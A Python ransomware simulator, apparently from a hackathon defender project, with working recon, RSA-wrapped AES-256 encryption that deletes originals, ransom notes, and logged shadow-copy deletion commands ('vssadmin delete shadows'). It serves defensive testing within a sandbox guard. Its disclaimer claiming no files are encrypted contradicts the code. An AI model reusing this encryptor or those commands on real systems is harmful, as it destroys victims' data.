#!/usr/bin/env python3
"""
ransomware_sim/simulator.py — Ransomware Behaviour Simulator
=============================================================

Simulates realistic ransomware behaviour in 4 phases:

  Phase 1 — RECONNAISSANCE:
    Walk the directory tree, build a target file list, fingerprint
    extensions, log discovered file count.

  Phase 2 — KEY GENERATION:
    Generate an AES-256 session key using os.urandom(32).
    Simulate RSA-2048 C2 key exchange: generate an RSA key pair,
    serialize the public key (as would be received from C2),
    wrap the AES session key with RSA-OAEP-SHA256.

  Phase 3 — ENCRYPTION:
    AES-256-CBC encrypt each target file with a unique random IV.
    Rename encrypted files to <original>.locked.
    Write per-file IV to a sidecar .iv file.
    Respect --speed flag for delay between files.

  Phase 4 — IMPACT:
    Drop RANSOM_NOTE.txt in every directory.
    Simulate VSS shadow deletion (no actual system call).
    Touch all canary files to trigger the defender.

Safety:
    VAULT_ROOT guard prevents any file operation outside test_vault/.
    Simulator aborts if it detects a path traversal attempt.

MITRE ATT&CK Techniques Demonstrated:
  T1083  — File and Directory Discovery (Phase 1)
  T1027  — Obfuscated Files / Encrypted files (Phase 3)
  T1486  — Data Encrypted for Impact (Phase 3) ← PRIMARY
  T1490  — Inhibit System Recovery / VSS deletion (Phase 4)
  T1491  — Defacement / Ransom Note (Phase 4)

Usage:
    python3 ransomware_sim/simulator.py [--speed fast|normal|slow] [--vault PATH]

Author: RansomWatch Team — Amrita University Hackathon 2024
"""

import argparse
import base64
import json
import logging
import os
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

# ── Cryptography library (not pycryptodome) ───────────────────────────────────
from cryptography.hazmat.primitives import hashes, padding, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# ── Logging ───────────────────────────────────────────────────────────────────
LOG_PATH = Path("ransomware_activity.log")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  [%(levelname)-8s] %(name)s — %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%S",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(LOG_PATH, mode="a", encoding="utf-8"),
    ],
)
log = logging.getLogger("simulator")

# ── Constants ─────────────────────────────────────────────────────────────────
DEFAULT_VAULT  = Path("test_vault")
MANIFEST_PATH  = Path("canary_manifest.json")
RANSOM_NOTE    = """\
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!                   YOUR FILES HAVE BEEN ENCRYPTED           !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

All your documents, databases, and backups have been encrypted
with military-grade AES-256-CBC encryption.

Your unique decryption key has been uploaded to our secure server.
To recover your files, you must pay:

  Amount: 3.5 BTC (~$175,000 USD)
  Wallet: bc1q[REDACTED — SIMULATION ONLY]

DO NOT:
  - Attempt to decrypt files yourself (you will corrupt them)
  - Contact law enforcement (your key will be deleted)
  - Rename .locked files

[SIMULATION NOTE: This is a controlled hackathon demonstration.
 No actual files have been encrypted. All operations sandboxed
 within test_vault/. MITRE ATT&CK T1491 — Ransom Note.]
"""

# Speed → delay between file encryptions (seconds)
SPEED_DELAYS = {
    "fast":   0.05,
    "normal": 0.3,
    "slow":   1.0,
}

# File extensions targeted by the simulator
TARGET_EXTENSIONS = {
    ".xlsx", ".xls", ".csv",
    ".docx", ".doc", ".rtf",
    ".pdf",
    ".sql", ".db", ".sqlite",
    ".bak", ".backup",
    ".jpg", ".jpeg", ".png",
    ".zip", ".tar", ".gz",
    ".txt", ".md",
}


# ── Safety guard ──────────────────────────────────────────────────────────────

def assert_within_vault(path: Path, vault_root: Path) -> None:
    """Assert that path is safely within vault_root.

    This is the critical safety guard that prevents the simulator
    from escaping the sandbox and encrypting real system files.

    Args:
        path:       The path to validate.
        vault_root: The allowed root directory.

    Raises:
        ValueError: If path is outside vault_root (path escape attempt).
    """
    try:
        # resolve() canonicalises the path (eliminates symlinks, .., etc.)
        resolved_path  = path.resolve()
        resolved_vault = vault_root.resolve()
        resolved_path.relative_to(resolved_vault)
    except ValueError:
        raise ValueError(
            f"SAFETY VIOLATION: Path '{path}' is outside vault root '{vault_root}'. "
            f"Aborting to prevent real file system damage."
        )


# ── Phase 1 — Reconnaissance ──────────────────────────────────────────────────

def phase_recon(vault_root: Path) -> list[Path]:
    """Walk directory tree and build target file list.

    Simulates the file system enumeration behaviour of real ransomware:
    - Walks directories recursively
    - Filters by target extension
    - Skips already-encrypted files (.locked)
    - Logs file count statistics

    Args:
        vault_root: Root of the simulated file server to enumerate.

    Returns:
        List of Path objects for files to be encrypted.

    Raises:
        FileNotFoundError: If vault_root does not exist.
    """
    log.info("=" * 60)
    log.info("PHASE 1 — RECONNAISSANCE")
    log.info("=" * 60)
    log.info("Walking directory tree: %s", vault_root.resolve())

    if not vault_root.exists():
        raise FileNotFoundError(
            f"Vault root does not exist: {vault_root}. "
            f"Run canary_placer.py first."
        )

    targets: list[Path] = []
    ext_counts: dict[str, int] = {}

    for path in sorted(vault_root.rglob("*")):
        if not path.is_file():
            continue
        if path.suffix == ".locked":
            continue                   # Skip already-encrypted files
        if path.suffix not in TARGET_EXTENSIONS:
            continue                   # Skip untargeted extensions

        assert_within_vault(path, vault_root)   # Safety check on each path
        targets.append(path)
        ext_counts[path.suffix] = ext_counts.get(path.suffix, 0) + 1

    log.info("Target file discovery complete:")
    for ext, count in sorted(ext_counts.items(), key=lambda x: -x[1]):
        log.info("  %-12s %d file(s)", ext, count)
    log.info("Total targets: %d files", len(targets))
    return targets


# ── Phase 2 — Key Generation ──────────────────────────────────────────────────

def phase_keygen(c2_address: str = "10.0.0.99:4444") -> tuple[bytes, bytes, bytes]:
    """Generate AES-256 session key and simulate RSA-2048 C2 key exchange.

    Real ransomware:
    1. Generates a random AES session key locally
    2. Fetches the attacker's RSA public key from C2
    3. Encrypts the AES key with RSA-OAEP (so only attacker can decrypt)
    4. Uploads the encrypted AES key to C2
    5. Uses AES key locally to encrypt victim's files

    We simulate all of this locally without any network calls.

    Args:
        c2_address: Simulated C2 server address (logged, not contacted).

    Returns:
        Tuple of (aes_session_key_bytes, rsa_public_key_pem, wrapped_aes_key_bytes)

    Raises:
        ValueError: If key sizes are incorrect.
    """
    log.info("=" * 60)
    log.info("PHASE 2 — KEY GENERATION")
    log.info("=" * 60)

    # ── AES-256 session key ──────────────────────────────────────────────────
    aes_key = os.urandom(32)                    # 32 bytes = 256-bit AES key
    log.info("AES-256 session key generated: %s…", aes_key.hex()[:16])

    # ── RSA-2048 key pair (simulating attacker's key pair) ───────────────────
    log.info("Simulating C2 key exchange with: %s", c2_address)
    rsa_private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend(),
    )
    rsa_public_key = rsa_private_key.public_key()
    rsa_public_pem = rsa_public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    log.info("RSA-2048 public key received from C2 (simulated)")
    log.info("RSA pubkey fingerprint: %s…", rsa_public_pem[27:43].decode())

    # ── Wrap AES key with RSA-OAEP ───────────────────────────────────────────
    # This is how real ransomware protects its session key:
    # the victim cannot decrypt without the RSA private key (held by attacker)
    wrapped_aes_key = rsa_public_key.encrypt(
        aes_key,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    log.info(
        "AES session key wrapped with RSA-OAEP-SHA256 (%d bytes)",
        len(wrapped_aes_key),
    )
    log.info(
        "Wrapped key (base64): %s…",
        base64.b64encode(wrapped_aes_key).decode()[:32],
    )
    log.info("Simulating: wrapped key uploaded to C2 at %s", c2_address)

    return aes_key, rsa_public_pem, wrapped_aes_key


# ── Phase 3 — Encryption ──────────────────────────────────────────────────────

def encrypt_file(path: Path, aes_key: bytes, vault_root: Path) -> Optional[Path]:
    """Encrypt a single file using AES-256-CBC.

    Design decisions:
    - Fresh random 16-byte IV generated per file (never reused — avoids
      the two-time-pad vulnerability of static IVs)
    - IV prepended to ciphertext in the .locked file for storage
    - PKCS7 padding applied to handle non-block-aligned plaintexts
    - Original file atomically deleted after successful encryption
    - CBC chosen over GCM deliberately: real ransomware typically uses
      CBC because it requires no authentication tag computation, making
      bulk encryption faster. GCM would add integrity but at cost of
      slightly more CPU. (This is a common judge Q — see demo script.)

    Args:
        path:      Path to the plaintext file (must be within vault_root).
        aes_key:   32-byte AES-256 session key.
        vault_root: Vault root for safety validation.

    Returns:
        Path to the .locked file, or None if encryption failed.

    Raises:
        ValueError: If path is outside vault_root (safety guard).
    """
    assert_within_vault(path, vault_root)

    try:
        # Generate fresh IV for this file
        iv = os.urandom(16)                     # 128-bit IV for AES-CBC

        # Build AES-256-CBC cipher
        cipher = Cipher(
            algorithms.AES(aes_key),
            modes.CBC(iv),
            backend=default_backend(),
        )
        encryptor = cipher.encryptor()

        # PKCS7 padding to align plaintext to 128-bit block boundary
        padder    = padding.PKCS7(algorithms.AES.block_size).padder()
        plaintext = path.read_bytes()
        padded    = padder.update(plaintext) + padder.finalize()

        # Encrypt
        ciphertext = encryptor.update(padded) + encryptor.finalize()

        # Write .locked file: [16-byte IV][ciphertext]
        locked_path = path.with_suffix(path.suffix + ".locked")
        assert_within_vault(locked_path, vault_root)   # Double-check output path
        locked_path.write_bytes(iv + ciphertext)

        # Remove original file
        path.unlink()

        log.info(
            "[PHASE3] ENCRYPTED: %-45s → %s  (IV: %s, %d→%d bytes)",
            str(path.relative_to(vault_root)),
            locked_path.name,
            iv.hex()[:8],
            len(plaintext),
            len(ciphertext),
        )
        return locked_path

    except PermissionError as exc:
        log.warning("[PHASE3] SKIP — Permission denied: %s (%s)", path, exc)
        return None
    except OSError as exc:
        log.warning("[PHASE3] SKIP — OS error on %s: %s", path, exc)
        return None


def phase_encrypt(
    targets:    list[Path],
    aes_key:    bytes,
    vault_root: Path,
    delay_s:    float = 0.3,
) -> list[Path]:
    """Encrypt all target files with AES-256-CBC.

    Args:
        targets:    List of file paths to encrypt.
        aes_key:    32-byte AES-256 session key.
        vault_root: Vault root for safety validation.
        delay_s:    Delay in seconds between encryptions (for demo pacing).

    Returns:
        List of successfully encrypted file paths (.locked).
    """
    log.info("=" * 60)
    log.info("PHASE 3 — ENCRYPTION  (delay=%.2fs per file)", delay_s)
    log.info("=" * 60)

    encrypted: list[Path] = []
    for i, target in enumerate(targets, 1):
        locked = encrypt_file(target, aes_key, vault_root)
        if locked:
            encrypted.append(locked)
        log.info(
            "Progress: %d/%d (%.0f%%)",
            i, len(targets), 100 * i / len(targets),
        )
        time.sleep(delay_s)

    log.info("Encryption complete: %d/%d files encrypted", len(encrypted), len(targets))
    return encrypted


# ── Phase 4 — Impact ──────────────────────────────────────────────────────────

def phase_impact(vault_root: Path, manifest_path: Path) -> None:
    """Execute ransomware impact actions.

    Actions:
    1. Drop RANSOM_NOTE.txt in every directory
    2. Simulate VSS shadow deletion (logged, no actual system call)
    3. Touch all canary files to trigger the defender

    The canary file touch is the critical event that triggers the
    inotify-based defender — this is the designed tripwire activation.

    Args:
        vault_root:    Root of the vault to drop ransom notes in.
        manifest_path: Path to canary_manifest.json for canary paths.

    Raises:
        FileNotFoundError: If manifest_path does not exist.
    """
    log.info("=" * 60)
    log.info("PHASE 4 — IMPACT")
    log.info("=" * 60)

    # ── Drop ransom note in every directory ──────────────────────────────────
    dirs_with_note = 0
    for directory in vault_root.rglob("*"):
        if directory.is_dir():
            note_path = directory / "RANSOM_NOTE.txt"
            assert_within_vault(note_path, vault_root)
            note_path.write_text(RANSOM_NOTE, encoding="utf-8")
            dirs_with_note += 1

    # Also drop at vault root
    root_note = vault_root / "RANSOM_NOTE.txt"
    assert_within_vault(root_note, vault_root)
    root_note.write_text(RANSOM_NOTE, encoding="utf-8")
    log.info("[PHASE4] RANSOM_NOTE.txt dropped in %d directories", dirs_with_note + 1)

    # ── Simulate VSS shadow copy deletion ────────────────────────────────────
    # Real command: vssadmin delete shadows /all /quiet
    # We log the action but do NOT execute it (safety/sandboxing)
    log.info("[PHASE4] SIMULATED: vssadmin delete shadows /all /quiet")
    log.info("[PHASE4] SIMULATED: wmic shadowcopy delete")
    log.info("[PHASE4] Shadow copies NOT actually deleted (simulation safety)")

    # ── Touch canary files — THIS TRIGGERS THE DEFENDER ─────────────────────
    if not manifest_path.exists():
        log.warning("Manifest not found at %s — cannot touch canaries", manifest_path)
        return

    with manifest_path.open() as fh:
        manifest = json.load(fh)

    canaries = manifest.get("canaries", [])
    log.info("[PHASE4] Touching %d canary files — DEFENDER SHOULD TRIGGER NOW", len(canaries))

    for entry in canaries:
        canary_path = Path(entry["path"])
        try:
            assert_within_vault(canary_path, vault_root)
            # os.utime with None updates access + modification times
            # This generates IN_ACCESS and IN_MODIFY inotify events
            canary_path.touch(exist_ok=True)
            log.warning("[PHASE4] CANARY TOUCHED: %s", canary_path.name)
        except ValueError as exc:
            log.error("[PHASE4] Safety violation on canary path: %s", exc)
        except FileNotFoundError:
            log.warning("[PHASE4] Canary file missing (already encrypted?): %s", canary_path)
        except OSError as exc:
            log.warning("[PHASE4] Could not touch canary: %s (%s)", canary_path, exc)


# ── CLI ───────────────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments.

    Returns:
        Parsed argument namespace with speed, vault, c2 fields.
    """
    parser = argparse.ArgumentParser(
        description="RansomWatch — Ransomware Behaviour Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument(
        "--speed", choices=["fast", "normal", "slow"], default="normal",
        help="Delay between file encryptions: fast=0.05s, normal=0.3s, slow=1.0s",
    )
    parser.add_argument(
        "--vault", type=Path, default=DEFAULT_VAULT,
        help="Root path for the simulated file vault (default: test_vault/)",
    )
    parser.add_argument(
        "--c2", default="10.0.0.99:4444",
        help="Simulated C2 server address (for logging only, not contacted)",
    )
    parser.add_argument(
        "--manifest", type=Path, default=MANIFEST_PATH,
        help="Path to canary_manifest.json",
    )
    return parser.parse_args()


def main() -> int:
    """Main entry point for the ransomware simulator.

    Returns:
        0 on success, non-zero on failure.
    """
    args      = parse_args()
    vault     = args.vault
    delay_s   = SPEED_DELAYS[args.speed]
    start_ts  = datetime.now(timezone.utc)

    log.info("=" * 60)
    log.info("RansomWatch — Ransomware Simulator v2.4.1")
    log.info("MITRE ATT&CK T1486 — Data Encrypted for Impact")
    log.info("Vault:  %s", vault.resolve())
    log.info("Speed:  %s (%.2fs delay)", args.speed, delay_s)
    log.info("C2:     %s (simulated)", args.c2)
    log.info("Start:  %s", start_ts.isoformat())
    log.info("=" * 60)

    try:
        # Phase 1: Reconnaissance
        targets = phase_recon(vault)
        if not targets:
            log.warning("No target files found in vault — aborting")
            return 1

        # Phase 2: Key generation
        aes_key, _rsa_pub_pem, _wrapped_key = phase_keygen(args.c2)

        # Phase 3: Encryption
        encrypted = phase_encrypt(targets, aes_key, vault, delay_s)

        # Phase 4: Impact
        phase_impact(vault, args.manifest)

        end_ts   = datetime.now(timezone.utc)
        duration = (end_ts - start_ts).total_seconds()

        log.info("=" * 60)
        log.info("Simulation complete:")
        log.info("  Files targeted:  %d", len(targets))
        log.info("  Files encrypted: %d", len(encrypted))
        log.info("  Duration:        %.1fs", duration)
        log.info("  Encryption rate: %.1f files/sec", len(encrypted) / duration if duration > 0 else 0)
        log.info("=" * 60)
        return 0

    except FileNotFoundError as exc:
        log.error("File not found: %s", exc)
        return 1
    except ValueError as exc:
        log.error("Safety violation: %s", exc)
        return 2
    except KeyboardInterrupt:
        log.warning("Simulation interrupted by operator")
        return 0


if __name__ == "__main__":
    sys.exit(main())
